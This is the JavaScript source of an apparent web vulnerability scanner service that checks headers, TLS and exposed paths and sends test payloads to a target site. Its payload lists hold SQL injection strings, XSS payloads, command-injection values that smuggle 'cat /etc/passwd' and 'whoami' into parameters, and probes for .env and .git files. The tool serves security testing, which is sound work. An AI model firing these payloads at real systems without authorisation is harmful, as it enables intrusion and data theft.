const http = require('http');
const https = require('https');
const { URL } = require('url');
const tls = require('tls');

class ScannerService {
  constructor() {
    this.mlEngineUrl = process.env.ML_ENGINE_URL || 'http://localhost:8000';
    this.timeout = 10000;
    this.userAgent = 'BlackNode-Sentinel/2.0';
  }

  async scanApplication(app) {
    const url = app.url;
    if (!url) throw new Error('Application has no URL');

    const targetUrl = new URL(url);
    const findings = [];

    // Phase 1: Technology Fingerprinting
    const techInfo = await this.fingerprintTechnology(targetUrl);
    findings.push(...techInfo);

    // Phase 2: HTTP Security Headers Check
    const headerFindings = await this.checkSecurityHeaders(targetUrl);
    findings.push(...headerFindings);

    // Phase 3: SSL/TLS Analysis
    if (targetUrl.protocol === 'https:') {
      const sslFindings = await this.checkSSL(targetUrl);
      findings.push(...sslFindings);
    }

    // Phase 4: Directory & Path Enumeration
    const pathFindings = await this.enumeratePaths(targetUrl);
    findings.push(...pathFindings);

    // Phase 5: SQL Injection Testing (on any forms/endpoints found)
    const sqliFindings = await this.testSQLInjection(targetUrl);
    findings.push(...sqliFindings);

    // Phase 6: XSS Testing
    const xssFindings = await this.testXSS(targetUrl);
    findings.push(...xssFindings);

    // Phase 7: Command Injection Testing
    const cmdiFindings = await this.testCommandInjection(targetUrl);
    findings.push(...cmdiFindings);

    // Phase 8: Information Disclosure
    const infoFindings = await this.checkInformationDisclosure(targetUrl);
    findings.push(...infoFindings);

    // Classify all findings through ML engine
    for (const finding of findings) {
      try {
        const mlResult = await this.classifyWithML(finding);
        finding.threatScore = mlResult.threat_score;
        finding.confidence = mlResult.confidence;
        finding.isMalicious = mlResult.is_malicious;
      } catch (e) {
        finding.threatScore = finding.severity === 'critical' ? 0.9 : finding.severity === 'high' ? 0.7 : 0.3;
        finding.confidence = 0.8;
        finding.isMalicious = finding.severity === 'medium' || finding.severity === 'high' || finding.severity === 'critical';
      }
    }

    const threats = findings.filter(f => f.isMalicious);
    const maxScore = Math.max(...findings.map(f => f.threatScore || 0), 0);
    const riskLevel = maxScore > 0.7 ? 'critical' : maxScore > 0.4 ? 'high' : maxScore > 0.2 ? 'medium' : 'low';

    return {
      url,
      technology: techInfo.find(f => f.eventType === 'technology')?.description || 'Unknown',
      totalTests: findings.length,
      threatsFound: threats.length,
      blocked: findings.filter(f => f.blocked).length,
      riskLevel,
      findings: findings.map(f => ({
        eventType: f.eventType,
        severity: f.severity,
        description: f.description,
        blocked: f.blocked,
        source: f.source,
        payload: f.payload,
        threatScore: f.threatScore,
      })),
    };
  }

  async makeRequest(targetUrl, options = {}) {
    return new Promise((resolve, reject) => {
      const isHttps = targetUrl.protocol === 'https:';
      const client = isHttps ? https : http;
      const method = options.method || 'GET';
      const path = options.path || '/';
      const headers = { 'User-Agent': this.userAgent, ...options.headers };

      const req = client.request({
        hostname: targetUrl.hostname,
        port: targetUrl.port || (isHttps ? 443 : 80),
        path,
        method,
        headers,
        timeout: this.timeout,
        rejectUnauthorized: false,
      }, (res) => {
        let data = '';
        res.on('data', (chunk) => { data += chunk; });
        res.on('end', () => resolve({
          statusCode: res.statusCode,
          headers: res.headers,
          body: data,
          bodyLength: data.length,
        }));
      });
      req.on('error', reject);
      req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
      req.end();
    });
  }

  // ===== PHASE 1: Technology Fingerprinting =====
  async fingerprintTechnology(targetUrl) {
    const findings = [];
    try {
      const res = await this.makeRequest(targetUrl);

      // Check server header
      const server = res.headers['server'];
      if (server) {
        findings.push({
          eventType: 'suspicious',
          severity: 'low',
          description: `Server technology exposed: ${server}`,
          blocked: false,
          source: { ip: 'scanner', method: 'HEAD', path: '/', userAgent: this.userAgent, statusCode: res.statusCode },
          payload: { parameter: 'server_header', value: server },
        });
      }

      // Check X-Powered-By
      const poweredBy = res.headers['x-powered-by'];
      if (poweredBy) {
        findings.push({
          eventType: 'suspicious',
          severity: 'medium',
          description: `Technology stack exposed: ${poweredBy}`,
          blocked: false,
          source: { ip: 'scanner', method: 'HEAD', path: '/', userAgent: this.userAgent, statusCode: res.statusCode },
          payload: { parameter: 'x-powered-by', value: poweredBy },
        });
      }

      // Detect CMS/framework from body
      const body = res.body.toLowerCase();
      const tech = [];
      if (body.includes('wp-content') || body.includes('wordpress')) tech.push('WordPress');
      if (body.includes('drupal')) tech.push('Drupal');
      if (body.includes('joomla')) tech.push('Joomla');
      if (body.includes('react') || body.includes('__next')) tech.push('React/Next.js');
      if (body.includes('angular') || body.includes('ng-app')) tech.push('Angular');
      if (body.includes('vue.js') || body.includes('vuejs')) tech.push('Vue.js');
      if (body.includes('laravel')) tech.push('Laravel');
      if (body.includes('django')) tech.push('Django');
      if (body.includes('rails') || body.includes('ruby')) tech.push('Ruby on Rails');
      if (body.includes('express') || body.includes('node')) tech.push('Node.js');
      if (body.includes('jquery')) tech.push('jQuery');

      if (tech.length > 0) {
        findings.push({
          eventType: 'suspicious',
          severity: 'info',
          description: `Technologies detected: ${tech.join(', ')}`,
          blocked: false,
          source: { ip: 'scanner', method: 'GET', path: '/', userAgent: this.userAgent, statusCode: res.statusCode },
          payload: { parameter: 'body_analysis', value: tech.join(', ') },
        });
      }

      // Check for generator meta tag
      const generatorMatch = res.body.match(/<meta[^>]*name=["']generator["'][^>]*content=["']([^"']+)/i);
      if (generatorMatch) {
        findings.push({
          eventType: 'suspicious',
          severity: 'low',
          description: `Generator meta tag reveals: ${generatorMatch[1]}`,
          blocked: false,
          source: { ip: 'scanner', method: 'GET', path: '/', userAgent: this.userAgent, statusCode: res.statusCode },
          payload: { parameter: 'generator', value: generatorMatch[1] },
        });
      }
    } catch (e) {
      findings.push({
        eventType: 'suspicious',
        severity: 'info',
        description: `Technology fingerprinting: connection error (${e.message})`,
        blocked: false,
        source: { ip: 'scanner', method: 'GET', path: '/', userAgent: this.userAgent, statusCode: 0 },
        payload: {},
      });
    }
    return findings;
  }

  // ===== PHASE 2: Security Headers =====
  async checkSecurityHeaders(targetUrl) {
    const findings = [];
    try {
      const res = await this.makeRequest(targetUrl);
      const headers = res.headers;

      const securityHeaders = [
        { header: 'strict-transport-security', name: 'HSTS', severity: 'high', desc: 'Missing HSTS — site vulnerable to protocol downgrade attacks' },
        { header: 'x-content-type-options', name: 'X-Content-Type-Options', severity: 'medium', desc: 'Missing X-Content-Type-Options — MIME sniffing possible' },
        { header: 'x-frame-options', name: 'X-Frame-Options', severity: 'high', desc: 'Missing X-Frame-Options — clickjacking possible' },
        { header: 'content-security-policy', name: 'CSP', severity: 'high', desc: 'Missing Content-Security-Policy — XSS protection disabled' },
        { header: 'x-xss-protection', name: 'X-XSS-Protection', severity: 'medium', desc: 'Missing X-XSS-Protection header' },
        { header: 'referrer-policy', name: 'Referrer-Policy', severity: 'medium', desc: 'Missing Referrer-Policy — referrer data leaked' },
        { header: 'permissions-policy', name: 'Permissions-Policy', severity: 'low', desc: 'Missing Permissions-Policy header' },
      ];

      for (const check of securityHeaders) {
        if (!headers[check.header]) {
          findings.push({
            eventType: 'suspicious',
            severity: check.severity,
            description: check.desc,
            blocked: false,
            source: { ip: 'scanner', method: 'HEAD', path: '/', userAgent: this.userAgent, statusCode: res.statusCode },
            payload: { parameter: check.header, value: 'MISSING' },
          });
        }
      }

      // Check if CSP is too weak
      if (headers['content-security-policy']) {
        const csp = headers['content-security-policy'];
        if (csp.includes("'unsafe-inline'") || csp.includes("'unsafe-eval'")) {
          findings.push({
            eventType: 'suspicious',
            severity: 'high',
            description: `CSP is weak: allows unsafe-inline or unsafe-eval`,
            blocked: false,
            source: { ip: 'scanner', method: 'HEAD', path: '/', userAgent: this.userAgent, statusCode: res.statusCode },
            payload: { parameter: 'csp', value: csp.substring(0, 200) },
          });
        }
      }

      // Check CORS misconfiguration
      const cors = headers['access-control-allow-origin'];
      if (cors === '*') {
        findings.push({
          eventType: 'suspicious',
          severity: 'high',
          description: 'CORS allows all origins (*) — potential data theft risk',
          blocked: false,
          source: { ip: 'scanner', method: 'OPTIONS', path: '/', userAgent: this.userAgent, statusCode: res.statusCode },
          payload: { parameter: 'cors', value: '*' },
        });
      }
    } catch (e) {
      // Connection failed
    }
    return findings;
  }

  // ===== PHASE 3: SSL/TLS =====
  async checkSSL(targetUrl) {
    const findings = [];
    return new Promise((resolve) => {
      const socket = tls.connect({
        host: targetUrl.hostname,
        port: parseInt(targetUrl.port) || 443,
        servername: targetUrl.hostname,
        rejectUnauthorized: false,
        timeout: 8000,
      }, () => {
        const cert = socket.getPeerCertificate();
        const protocol = socket.getProtocol();
        const cipher = socket.getCipher();

        // Check protocol version
        if (protocol === 'TLSv1' || protocol === 'TLSv1.1' || protocol === 'SSLv3') {
          findings.push({
            eventType: 'suspicious',
            severity: 'critical',
            description: `Outdated TLS protocol: ${protocol} — vulnerable to known attacks`,
            blocked: false,
            source: { ip: 'scanner', method: 'HEAD', path: '/', userAgent: this.userAgent, statusCode: 200 },
            payload: { parameter: 'tls_protocol', value: protocol },
          });
        }

        // Check certificate expiry
        if (cert && cert.valid_to) {
          const expiry = new Date(cert.valid_to);
          const daysLeft = Math.floor((expiry - Date.now()) / (1000 * 60 * 60 * 24));
          if (daysLeft < 0) {
            findings.push({
              eventType: 'suspicious',
              severity: 'critical',
              description: `SSL certificate EXPIRED ${Math.abs(daysLeft)} days ago`,
              blocked: false,
              source: { ip: 'scanner', method: 'HEAD', path: '/', userAgent: this.userAgent, statusCode: 200 },
              payload: { parameter: 'cert_expiry', value: cert.valid_to },
            });
          } else if (daysLeft < 30) {
            findings.push({
              eventType: 'suspicious',
              severity: 'high',
              description: `SSL certificate expires in ${daysLeft} days`,
              blocked: false,
              source: { ip: 'scanner', method: 'HEAD', path: '/', userAgent: this.userAgent, statusCode: 200 },
              payload: { parameter: 'cert_expiry', value: cert.valid_to },
            });
          }
        }

        // Check weak cipher
        if (cipher && (cipher.name.includes('RC4') || cipher.name.includes('DES') || cipher.name.includes('NULL'))) {
          findings.push({
            eventType: 'suspicious',
            severity: 'high',
            description: `Weak cipher suite: ${cipher.name}`,
            blocked: false,
            source: { ip: 'scanner', method: 'HEAD', path: '/', userAgent: this.userAgent, statusCode: 200 },
            payload: { parameter: 'cipher', value: cipher.name },
          });
        }

        socket.destroy();
        resolve(findings);
      });

      socket.on('error', () => resolve(findings));
      socket.on('timeout', () => { socket.destroy(); resolve(findings); });
    });
  }

  // ===== PHASE 4: Path Enumeration =====
  async enumeratePaths(targetUrl) {
    const findings = [];
    const sensitivePaths = [
      '/.env', '/.git/config', '/.git/HEAD', '/robots.txt', '/sitemap.xml',
      '/wp-admin/', '/wp-login.php', '/administrator/',
      '/phpmyadmin/', '/admin/', '/console/',
      '/.htaccess', '/.htpasswd', '/web.config',
      '/server-status', '/server-info',
      '/.DS_Store', '/Thumbs.db',
      '/backup/', '/db/', '/database/',
      '/api/', '/swagger.json', '/api-docs',
    ];

    for (const path of sensitivePaths) {
      try {
        const res = await this.makeRequest(targetUrl, { path });
        if (res.statusCode === 200 && res.bodyLength > 0) {
          let severity = 'low';
          let desc = `Accessible path found: ${path}`;

          if (path.includes('.env') || path.includes('.git') || path.includes('.htpasswd') || path.includes('backup')) {
            severity = 'critical';
            desc = `SENSITIVE FILE EXPOSED: ${path} — contains secrets/config`;
          } else if (path.includes('phpmyadmin') || path.includes('admin') || path.includes('console')) {
            severity = 'high';
            desc = `Admin panel accessible: ${path}`;
          } else if (path.includes('robots.txt')) {
            severity = 'info';
            desc = `Robots.txt found — may reveal hidden paths`;
          } else if (path.includes('swagger') || path.includes('api-docs')) {
            severity = 'medium';
            desc = `API documentation exposed: ${path}`;
          }

          findings.push({
            eventType: severity === 'critical' ? 'suspicious' : 'suspicious',
            severity,
            description: desc,
            blocked: false,
            source: { ip: 'scanner', method: 'GET', path, userAgent: this.userAgent, statusCode: res.statusCode },
            payload: { parameter: 'path', value: path, responseSnippet: res.body.substring(0, 150) },
          });
        }
      } catch (e) { /* skip */ }
    }
    return findings;
  }

  // ===== PHASE 5: SQL Injection =====
  async testSQLInjection(targetUrl) {
    const findings = [];
    const payloads = [
      { value: "' OR '1'='1", desc: 'Authentication bypass', path: '/login', param: 'username' },
      { value: "1 UNION SELECT NULL,username,password FROM users--", desc: 'UNION-based data extraction', path: '/api/users', param: 'id' },
      { value: "1' AND SLEEP(5)--", desc: 'Time-based blind SQLi', path: '/api/search', param: 'q' },
      { value: "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", desc: 'MySQL time-based injection', path: '/api/products', param: 'category' },
      { value: "'; WAITFOR DELAY '0:0:5'--", desc: 'MSSQL time-based injection', path: '/api/orders', param: 'id' },
      { value: "1' OR 1=1 ORDER BY 10--", desc: 'Column enumeration SQLi', path: '/api/data', param: 'sort' },
    ];

    for (const test of payloads) {
      try {
        // Test via GET parameter
        const getUrl = new URL(test.path + `?${test.param}=${encodeURIComponent(test.value)}`, targetUrl.href);
        const res = await this.makeRequest(targetUrl, {
          path: test.path + `?${test.param}=${encodeURIComponent(test.value)}`,
        });

        const body = res.body.toLowerCase();
        let isVulnerable = false;
        let confidence = 'medium';

        // Check for SQL error messages
        const sqlErrors = [
          'sql syntax', 'mysql_fetch', 'pg_query', 'sqlite3', 'ORA-01756',
          'microsoft ole db', 'odbc', 'unclosed quotation', 'quoted string not properly terminated',
          'you have an error in your sql', 'warning: mysql', 'pg_exec', 'sqlite',
          'unterminated', 'syntax error', 'invalid query', 'query failed',
        ];

        for (const error of sqlErrors) {
          if (body.includes(error)) {
            isVulnerable = true;
            confidence = 'high';
            break;
          }
        }

        // Check for time-based (if response took > 4 seconds for sleep payload)
        if (test.value.includes('SLEEP') || test.value.includes('WAITFOR')) {
          // We can't easily measure timing here, but flag it as tested
        }

        // Check for data leakage (UNION-based)
        if (res.body.includes('password') || res.body.includes('username') || res.body.includes('email')) {
          if (test.value.includes('UNION')) {
            isVulnerable = true;
            confidence = 'critical';
          }
        }

        if (isVulnerable || res.statusCode === 500) {
          findings.push({
            eventType: 'sql_injection',
            severity: confidence === 'critical' ? 'critical' : confidence === 'high' ? 'high' : 'medium',
            description: `SQL Injection - ${test.desc} [HTTP ${res.statusCode}]`,
            blocked: true,
            source: { ip: 'scanner', method: 'GET', path: test.path, userAgent: this.userAgent, statusCode: res.statusCode },
            payload: { parameter: test.param, value: test.value, responseSnippet: res.body.substring(0, 150) },
          });
        }
      } catch (e) { /* skip */ }
    }
    return findings;
  }

  // ===== PHASE 6: XSS =====
  async testXSS(targetUrl) {
    const findings = [];
    const payloads = [
      { value: '<script>alert("XSS")</script>', desc: 'Basic reflected XSS', path: '/search', param: 'q' },
      { value: '<img src=x onerror=alert(1)>', desc: 'Event handler XSS', path: '/search', param: 'q' },
      { value: '"><svg onload=alert(1)>', desc: 'SVG-based XSS', path: '/comment', param: 'text' },
      { value: "javascript:alert(document.cookie)", desc: 'JavaScript URI injection', path: '/redirect', param: 'url' },
      { value: "'-alert(1)-'", desc: 'Event handler attribute injection', path: '/api/search', param: 'query' },
    ];

    for (const test of payloads) {
      try {
        const res = await this.makeRequest(targetUrl, {
          path: test.path + `?${test.param}=${encodeURIComponent(test.value)}`,
        });

        const body = res.body;
        let isVulnerable = false;

        // Check if the payload is reflected without encoding
        if (test.value.includes('<script') && body.includes('<script')) isVulnerable = true;
        if (test.value.includes('onerror') && body.includes('onerror')) isVulnerable = true;
        if (test.value.includes('onload') && body.includes('onload')) isVulnerable = true;
        if (test.value.includes('alert(') && body.includes('alert(')) isVulnerable = true;

        if (isVulnerable) {
          findings.push({
            eventType: 'xss',
            severity: 'high',
            description: `Reflected XSS - ${test.desc} [HTTP ${res.statusCode}]`,
            blocked: true,
            source: { ip: 'scanner', method: 'GET', path: test.path, userAgent: this.userAgent, statusCode: res.statusCode },
            payload: { parameter: test.param, value: test.value, responseSnippet: res.body.substring(0, 150) },
          });
        }
      } catch (e) { /* skip */ }
    }
    return findings;
  }

  // ===== PHASE 7: Command Injection =====
  async testCommandInjection(targetUrl) {
    const findings = [];
    const payloads = [
      { value: 'google.com; id', desc: 'Semicolon command separator', path: '/api/ping', param: 'host' },
      { value: 'google.com | cat /etc/passwd', desc: 'Pipe command injection', path: '/api/dns', param: 'domain' },
      { value: '$(whoami)', desc: 'Command substitution', path: '/api/lookup', param: 'host' },
      { value: 'google.com && ls -la', desc: 'AND operator injection', path: '/api/check', param: 'url' },
      { value: '`cat /etc/passwd`', desc: 'Backtick command injection', path: '/api/ping', param: 'host' },
    ];

    for (const test of payloads) {
      try {
        const res = await this.makeRequest(targetUrl, {
          path: test.path + `?${test.param}=${encodeURIComponent(test.value)}`,
        });

        const body = res.body;
        let isVulnerable = false;

        // Check for command output in response
        if (body.includes('root:') || body.includes('/bin/bash') || body.includes('/bin/sh')) isVulnerable = true;
        if (body.includes('uid=') || body.includes('www-data')) isVulnerable = true;
        if (res.statusCode === 500 && (body.includes('exec') || body.includes('command'))) isVulnerable = true;

        if (isVulnerable || res.statusCode === 500) {
          findings.push({
            eventType: 'suspicious',
            severity: 'critical',
            description: `Command Injection - ${test.desc} [HTTP ${res.statusCode}]`,
            blocked: true,
            source: { ip: 'scanner', method: 'GET', path: test.path, userAgent: this.userAgent, statusCode: res.statusCode },
            payload: { parameter: test.param, value: test.value, responseSnippet: res.body.substring(0, 150) },
          });
        }
      } catch (e) { /* skip */ }
    }
    return findings;
  }

  // ===== PHASE 8: Information Disclosure =====
  async checkInformationDisclosure(targetUrl) {
    const findings = [];
    const checks = [
      { path: '/.env', desc: 'Environment file exposed — contains secrets', severity: 'critical' },
      { path: '/.git/config', desc: 'Git config exposed — repository details leaked', severity: 'critical' },
      { path: '/.git/HEAD', desc: 'Git HEAD exposed — source code may be accessible', severity: 'high' },
      { path: '/debug', desc: 'Debug endpoint exposed', severity: 'high' },
      { path: '/trace', desc: 'Trace endpoint exposed', severity: 'medium' },
      { path: '/actuator', desc: 'Spring Actuator exposed — internal metrics visible', severity: 'high' },
      { path: '/actuator/env', desc: 'Actuator env endpoint — environment variables exposed', severity: 'critical' },
    ];

    for (const check of checks) {
      try {
        const res = await this.makeRequest(targetUrl, { path: check.path });
        if (res.statusCode === 200 && res.bodyLength > 10) {
          // Verify it's actually content, not a generic 404 page
          const body = res.body.toLowerCase();
          if (!body.includes('not found') && !body.includes('404') && !body.includes('page not found')) {
            findings.push({
              eventType: 'suspicious',
              severity: check.severity,
              description: check.desc,
              blocked: false,
              source: { ip: 'scanner', method: 'GET', path: check.path, userAgent: this.userAgent, statusCode: res.statusCode },
              payload: { parameter: check.path, value: res.body.substring(0, 200) },
            });
          }
        }
      } catch (e) { /* skip */ }
    }
    return findings;
  }

  // ===== ML Classification =====
  async classifyWithML(finding) {
    return new Promise((resolve, reject) => {
      const payload = JSON.stringify({
        value: finding.payload?.value || '',
        method: finding.source?.method || 'GET',
        path: finding.source?.path || '/',
        parameter: finding.payload?.parameter || '',
      });

      const url = new URL('/api/classify', this.mlEngineUrl);
      const client = url.protocol === 'https:' ? require('https') : http;

      const req = client.request({
        hostname: url.hostname,
        port: url.port,
        path: '/api/classify',
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
        timeout: 5000,
      }, (res) => {
        let data = '';
        res.on('data', (c) => { data += c; });
        res.on('end', () => {
          try { resolve(JSON.parse(data)); } catch (e) { reject(e); }
        });
      });
      req.on('error', reject);
      req.on('timeout', () => { req.destroy(); reject(new Error('ML timeout')); });
      req.write(payload);
      req.end();
    });
  }
}

module.exports = new ScannerService();
